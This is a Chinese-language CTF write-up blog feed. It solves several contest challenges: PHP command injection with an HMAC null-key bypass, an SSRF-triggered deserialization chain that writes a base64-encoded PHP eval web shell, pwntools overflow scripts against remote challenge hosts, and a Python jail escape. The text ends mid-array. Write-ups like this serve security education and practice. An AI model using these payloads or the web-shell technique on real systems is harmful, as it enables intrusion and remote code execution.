exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code>来读取文件<br>那么就要绕过前面的几个<code>die</code>来让脚本继续执行<br>有3个参数：</p><ol><li><code>Black-Cat-Sheriff</code></li><li><code>One-ear</code></li><li><code>White-cat-monitor</code></li></ol><p>这里exec回显一行结果，用dir来找目录下文件<br>这里将传入的<code>&#39;One-ear&#39;</code>与<code>&quot;nc&quot;</code>连接，可以用分号来执行多条命令，所以传入<code>One-ear=;dir</code><br>再看另外两个参数<br><img src="/wp/ycb2020/7.png"><br><code>$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);</code><br>对传入的<code>White-cat-monitor</code>以<code>$clandestine</code>为key计算sha256，key由环境变量获取<br>而这次计算的结果<code>$clandestine</code>作为下一个$hh的key<br><code>$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);</code><br>但<code>$clandestine</code>我们无法得知，所以<code>if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;])</code>无法成立<br>但我们对<code>White-cat-monitor</code>传入数组，让<code>$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);</code>报错返回NULL，这样我们下一个$hh的key就是NULL了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>,<span class="hljs-string">&#x27;;dir&#x27;</span>,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hh</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//83a52f8ff4e399417109312e0539c80147b5514586c45a6caeb3681ad9c1a395</span><br></code></pre></td></tr></table></figure><p>这样就能命令执行了<br><code>Black-Cat-Sheriff=83a52f8ff4e399417109312e0539c80147b5514586c45a6caeb3681ad9c1a395&amp;One-ear=;dir&amp;White-cat-monitor[]=1</code><br><img src="/wp/ycb2020/8.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>,<span class="hljs-string">&#x27;;nl flag*&#x27;</span>,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hh</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//989bea3b0fac784fdbb673336b1ba564ed81e8066de71903d3e42f47b5ff98ac</span><br></code></pre></td></tr></table></figure><p><code>Black-Cat-Sheriff=989bea3b0fac784fdbb673336b1ba564ed81e8066de71903d3e42f47b5ff98ac&amp;One-ear=;nl flag*&amp;White-cat-monitor[]=1</code><br><img src="/wp/ycb2020/9.png"></p><h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><p><img src="/wp/ycb2020/10.png"><br><img src="/wp/ycb2020/11.png"><br>看源码<br><img src="/wp/ycb2020/12.png"><br>不安全指http，而不是https<br>ssrf读取文件<br><code>[http://127.0.0.1/star1.php](http://127.0.0.1/star1.php)</code><br><img src="/wp/ycb2020/13.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;127.0.0.1&quot;</span> ) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yasuo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hero))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;hero-&gt;<span class="hljs-title function_ invoke__">hasaki</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You don&#x27;t look very happy&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span>&#123; <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$text</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; text = <span class="hljs-variable">$text</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$d</span>   = <span class="hljs-string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$a</span>= <span class="hljs-variable">$d</span>. <span class="hljs-variable language_">$this</span>-&gt;text;<br>         @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; file,<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yasuo</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m the best happy windy man&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>构造反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>&#125;<br><span class="hljs-variable">$door</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">GWHT</span>();<br><span class="hljs-variable">$door</span>-&gt;hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yongen</span>();<br><span class="hljs-variable">$door</span>-&gt;hero-&gt;file = <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>;<br><span class="hljs-variable">$door</span>-&gt;hero-&gt;text = <span class="hljs-string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$door</span>)).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>用arjun扫参数是c<br>但是我扫不出来0.0.<br><img src="/wp/ycb2020/14.png"><br>payload：<code>path=[http://127.0.0.1/star1.php&amp;c=](http://127.0.0.1/star1.php&amp;c=O:4:&quot;GWHT&quot;:1:&#123;s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:&#123;s:4:&quot;file&quot;;s:77:&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;)O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A77%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.strip_tags%7Cconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A40%3A%22PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D%22%3B%7D%7D</code><br><img src="/wp/ycb2020/15.png"><br><img src="/wp/ycb2020/16.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Incognito 4.0</title>
    <link href="/2023/02/20/Incognito%204.0/"/>
    <url>/2023/02/20/Incognito%204.0/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="get-flag-1"><a href="#get-flag-1" class="headerlink" title="get flag 1"></a>get flag 1</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>All you need to do is get the flag at :9001/flag.txt<br><a href="http://45.79.210.216:5000/">http://45.79.210.216:5000</a></p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>[http://0.0.0.0:9001/flag.txt](http://0.0.0.0:9001/flag.txt)</code><br><img src="/mdimg/ictf/1.png"></p><h3 id="get-flag-2"><a href="#get-flag-2" class="headerlink" title="get flag 2"></a>get flag 2</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>I have upgraded my server to make it future proof. Let’s see if you can get the flag now. Flag at :9001/flag.txt<br><a href="http://45.79.216.81:5000/">http://45.79.216.81:5000</a></p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>http://[::]:9001/flag.txt</code><br><img src="/mdimg/ictf/2.png"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="babyFlow"><a href="#babyFlow" class="headerlink" title="babyFlow"></a>babyFlow</h3><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;143.198.219.171&#x27;</span>,<span class="hljs-number">5000</span>)<br>p.recv()<br>g = (<span class="hljs-number">0x14</span>+<span class="hljs-number">4</span>)*<span class="hljs-string">&#x27;a&#x27;</span>+p32(<span class="hljs-number">0x80491fc</span>)<br>p.sendline(g)<br>p.interactive()<br><br><span class="hljs-comment">#ictf&#123;bf930bcd-6c10-4c05-bdd8-435db4b50cdb&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Gainme"><a href="#Gainme" class="headerlink" title="Gainme"></a>Gainme</h3><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>p  = remote(<span class="hljs-string">&#x27;143.198.219.171&#x27;</span>,<span class="hljs-number">5003</span>)<br>p.recvline()<br>p.recvuntil(<span class="hljs-string">&#x27;Level 0:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;ICTF4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Level 1:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;dasDASQWgjtrkodsc&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Level 2:&#x27;</span>)<br>p.sendline(p64(<span class="hljs-number">0xDEADBEEF</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;Level 3:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.interactive()<br><br><span class="hljs-comment">#ictf&#123;g@inm3-sf23f-4fd2150cd33db&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h3><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Meow&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-built_in">print</span>(data[<span class="hljs-number">1</span>::<span class="hljs-number">2</span>].decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br><br><span class="hljs-comment">#ictf&#123;easiest_challenge_of_them_all&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Ancient"><a href="#Ancient" class="headerlink" title="Ancient"></a>Ancient</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>Found an ancient image file but unable to figure out what this is. Could you help me out?</p><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>下载的图片需要手动加png文件头<br><img src="/mdimg/ictf/3.png"><br>谷歌识图<br><img src="/mdimg/ictf/4.png"><br><code>[https://jsom1.github.io/_challenges/templed](https://jsom1.github.io/_challenges/templed)</code><br>一个比赛原题<br>手动对着表转一下就行<br><img src="/mdimg/ictf/5.png"></p><h3 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    cy = f.read()<br><span class="hljs-built_in">print</span>(cy)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cy))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">f, i</span>):<br>    <span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">5</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xAD</span><br>        var1 = (out &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span><br>        var2 = <span class="hljs-number">2</span> * out &amp; <span class="hljs-number">0xAA</span><br>        <span class="hljs-keyword">return</span> var1 | var2 <br>    <span class="hljs-keyword">elif</span> i&gt;=<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> i&lt;<span class="hljs-number">10</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xBE</span><br>        var1 = (out &amp; <span class="hljs-number">0xCC</span>) &gt;&gt; <span class="hljs-number">2</span><br>        var2 = <span class="hljs-number">4</span> * out &amp; <span class="hljs-number">0xCC</span><br>        <span class="hljs-keyword">return</span> var1 | var2<br>    <span class="hljs-keyword">else</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xEF</span><br>        var1 = (out &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span><br>        var2 = <span class="hljs-number">16</span> * out &amp; <span class="hljs-number">0xF0</span><br>        <span class="hljs-keyword">return</span> var1 | var2<br><br>dic = &#123;&#125;<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        t = <span class="hljs-built_in">chr</span>(func(<span class="hljs-built_in">chr</span>(j), i))<br>        <span class="hljs-keyword">if</span> t==cy[i]:<br>            <span class="hljs-built_in">print</span>(i, <span class="hljs-built_in">chr</span>(j), j)<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#ictf&#123;88f30d1cd1ab443&#125;</span><br></code></pre></td></tr></table></figure><h2 id="TheOnlyJail"><a href="#TheOnlyJail" class="headerlink" title="TheOnlyJail"></a>TheOnlyJail</h2><h3 id="TheOnlyJail-1"><a href="#TheOnlyJail-1" class="headerlink" title="TheOnlyJail"></a>TheOnlyJail</h3><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br>os.system(b64.base64decode(<span class="hljs-string">&quot;some_base64_encoded_command_like_cat /home/ctf/flag.txt&quot;</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0xL4ughCTF2023</title>
    <link href="/2023/02/19/0xL4ughCTF/"/>
    <url>/2023/02/19/0xL4ughCTF/</url>
    
    <content type="html"><![CDATA[<p><strong>部分附件(包含wp内所有题目)：链接：<a href="https://pan.baidu.com/s/19YZXz_T0S3ZCEbnHkdlV0g?pwd=6666">https://pan.baidu.com/s/19YZXz_T0S3ZCEbnHkdlV0g?pwd=6666</a></strong><br><strong>提取码：6666</strong></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="att-ip"><a href="#att-ip" class="headerlink" title="att ip"></a>att ip</h3><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/1.png"><br><code>0xL4ugh&#123;91.243.59.76_23927&#125;</code></p><h3 id="PVE"><a href="#PVE" class="headerlink" title="PVE"></a>PVE</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>volatility3查看linux版本<br><code>0xL4ugh&#123;Ubuntu_4.4.0-186-generic&#125;</code></p><h5 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h5><p><img src="/mdimg/0xl4/2.png"><br><code>0xL4ugh&#123;2.2.14&#125;</code></p><h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h5><p><img src="/mdimg/0xl4/3.png"><br><code>0xL4ugh&#123;S4D_Y0U_G07_M3&#125;</code></p><h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h5><p><img src="/mdimg/0xl4/4.png"><br><code>0xL4ugh&#123;H1DD3N_1N_PR0CE$$&#125;</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Bypass-Basic"><a href="#Bypass-Basic" class="headerlink" title="Bypass ( Basic )"></a>Bypass ( Basic )</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Some one reported to our Bug Bounty Program that he found a secret page that discloses some senstive information and we forbidden any access to it <a href="http://20.121.121.120/secret.php">link</a><br>Author : abdoghazy</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="http://web.archive.org/">http://web.archive.org/</a><br><img src="/mdimg/0xl4/5.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto 1"></a>Crypto 1</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>Alice and Bob decided to create their own super cryptosystem. However.. it has a super flaw<br>Flag : OSC{}</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ct = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">79</span>, <span class="hljs-number">159</span>, <span class="hljs-number">317</span>, <span class="hljs-number">635</span>, <span class="hljs-number">1269</span>, <span class="hljs-number">2538</span>, <span class="hljs-number">5077</span>, <span class="hljs-number">10154</span>, <span class="hljs-number">20307</span>, <span class="hljs-number">40615</span>, <span class="hljs-number">81229</span>, <span class="hljs-number">162458</span>, <span class="hljs-number">324916</span>, <span class="hljs-number">649832</span>, <span class="hljs-number">1299665</span>, <span class="hljs-number">2599330</span>, <span class="hljs-number">5198659</span>, <span class="hljs-number">10397319</span>, <span class="hljs-number">20794638</span>, <span class="hljs-number">41589276</span>, <span class="hljs-number">83178552</span>, <span class="hljs-number">166357103</span>, <span class="hljs-number">332714207</span>, <span class="hljs-number">665428414</span>, <span class="hljs-number">1330856827</span>, <span class="hljs-number">2661713655</span>, <span class="hljs-number">5323427309</span>, <span class="hljs-number">10646854619</span>, <span class="hljs-number">21293709237</span>, <span class="hljs-number">42587418474</span>, <span class="hljs-number">85174836949</span>, <span class="hljs-number">170349673898</span>, <span class="hljs-number">340699347795</span>, <span class="hljs-number">681398695591</span>, <span class="hljs-number">1362797391181</span>, <span class="hljs-number">2725594782363</span>, <span class="hljs-number">5451189564725</span>, <span class="hljs-number">10902379129451</span>, <span class="hljs-number">21804758258901</span>, <span class="hljs-number">43609516517803</span>, <span class="hljs-number">87219033035605</span>, <span class="hljs-number">174438066071211</span>, <span class="hljs-number">348876132142421</span>, <span class="hljs-number">697752264284843</span>, <span class="hljs-number">1395504528569685</span>, <span class="hljs-number">2791009057139370</span>, <span class="hljs-number">5582018114278740</span>, <span class="hljs-number">11164036228557480</span>, <span class="hljs-number">22328072457114960</span>, <span class="hljs-number">44656144914229920</span>, <span class="hljs-number">89312289828459841</span>, <span class="hljs-number">178624579656919682</span>, <span class="hljs-number">357249159313839363</span>, <span class="hljs-number">714498318627678726</span>, <span class="hljs-number">1428996637255357453</span>, <span class="hljs-number">2857993274510714906</span>, <span class="hljs-number">5715986549021429811</span>, <span class="hljs-number">11431973098042859623</span>, <span class="hljs-number">22863946196085719246</span>, <span class="hljs-number">45727892392171438492</span>, <span class="hljs-number">91455784784342876983</span>, <span class="hljs-number">182911569568685753966</span>, <span class="hljs-number">365823139137371507933</span>, <span class="hljs-number">731646278274743015865</span>, <span class="hljs-number">1463292556549486031730</span>, <span class="hljs-number">2926585113098972063460</span>, <span class="hljs-number">5853170226197944126921</span>, <span class="hljs-number">11706340452395888253841</span>, <span class="hljs-number">23412680904791776507682</span>, <span class="hljs-number">46825361809583553015364</span>, <span class="hljs-number">93650723619167106030728</span>, <span class="hljs-number">187301447238334212061457</span>, <span class="hljs-number">374602894476668424122913</span>, <span class="hljs-number">749205788953336848245827</span>, <span class="hljs-number">1498411577906673696491653</span>, <span class="hljs-number">2996823155813347392983306</span>, <span class="hljs-number">5993646311626694785966613</span>, <span class="hljs-number">11987292623253389571933226</span>, <span class="hljs-number">23974585246506779143866452</span>, <span class="hljs-number">47949170493013558287732903</span>, <span class="hljs-number">95898340986027116575465806</span>, <span class="hljs-number">191796681972054233150931613</span>, <span class="hljs-number">383593363944108466301863225</span>, <span class="hljs-number">767186727888216932603726450</span>, <span class="hljs-number">1534373455776433865207452900</span>, <span class="hljs-number">3068746911552867730414905800</span>, <span class="hljs-number">6137493823105735460829811601</span>, <span class="hljs-number">12274987646211470921659623202</span>, <span class="hljs-number">24549975292422941843319246403</span>, <span class="hljs-number">49099950584845883686638492807</span>, <span class="hljs-number">98199901169691767373276985614</span>, <span class="hljs-number">196399802339383534746553971228</span>, <span class="hljs-number">392799604678767069493107942455</span>, <span class="hljs-number">785599209357534138986215884910</span>, <span class="hljs-number">1571198418715068277972431769821</span>, <span class="hljs-number">3142396837430136555944863539641</span>, <span class="hljs-number">6284793674860273111889727079282</span>, <span class="hljs-number">12569587349720546223779454158564</span>, <span class="hljs-number">25139174699441092447558908317129</span>, <span class="hljs-number">50278349398882184895117816634258</span>, <span class="hljs-number">100556698797764369790235633268515</span>, <span class="hljs-number">201113397595528739580471266537030</span>, <span class="hljs-number">402226795191057479160942533074061</span>, <span class="hljs-number">804453590382114958321885066148122</span>, <span class="hljs-number">1608907180764229916643770132296243</span>, <span class="hljs-number">3217814361528459833287540264592486</span>, <span class="hljs-number">6435628723056919666575080529184973</span>, <span 